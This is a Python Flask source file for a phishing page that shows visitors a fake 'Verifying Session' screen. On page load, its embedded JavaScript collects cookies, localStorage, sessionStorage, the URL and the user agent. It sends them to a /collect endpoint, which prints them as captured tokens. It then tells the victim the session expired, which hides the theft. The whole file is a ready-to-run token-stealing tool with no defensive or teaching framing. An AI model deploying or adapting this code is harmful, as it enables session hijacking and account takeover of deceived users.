from flask import Flask, request, render_template_string, jsonify
import os

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f5f5f5; }
        .container { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 90%; width: 350px; }
        h1 { color: #333; font-size: 20px; }
        p { color: #666; font-size: 14px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Verifying Session...</h1>
        <p>Please wait while we confirm your identity.</p>
    </div>

    <script>
        async function stealTokens() {
            let stolenData = {
                localStorage: {},
                sessionStorage: {},
                cookies: document.cookie,
                url: window.location.href,
                userAgent: navigator.userAgent
            };

            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                stolenData.localStorage[key] = localStorage.getItem(key);
            }

            for (let i = 0; i < sessionStorage.length; i++) {
                let key = sessionStorage.key(i);
                stolenData.sessionStorage[key] = sessionStorage.getItem(key);
            }

            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(stolenData)
                });
            } catch (e) {}

            document.querySelector('.container').innerHTML = '<h1>Session Expired</h1><p>Please close this page and log in again on the official app.</p>';
        }

        window.onload = stealTokens;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        print("\n" + "="*50, flush=True)
        print("[+] NEW TOKEN CAPTURED!", flush=True)
        print("="*50, flush=True)
        print(f"[*] URL: {data.get('url')}", flush=True)
        print(f"[*] Cookies: {data.get('cookies')}", flush=True)
        print(f"[*] LocalStorage: {data.get('localStorage')}", flush=True)
        print("="*50 + "\n", flush=True)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))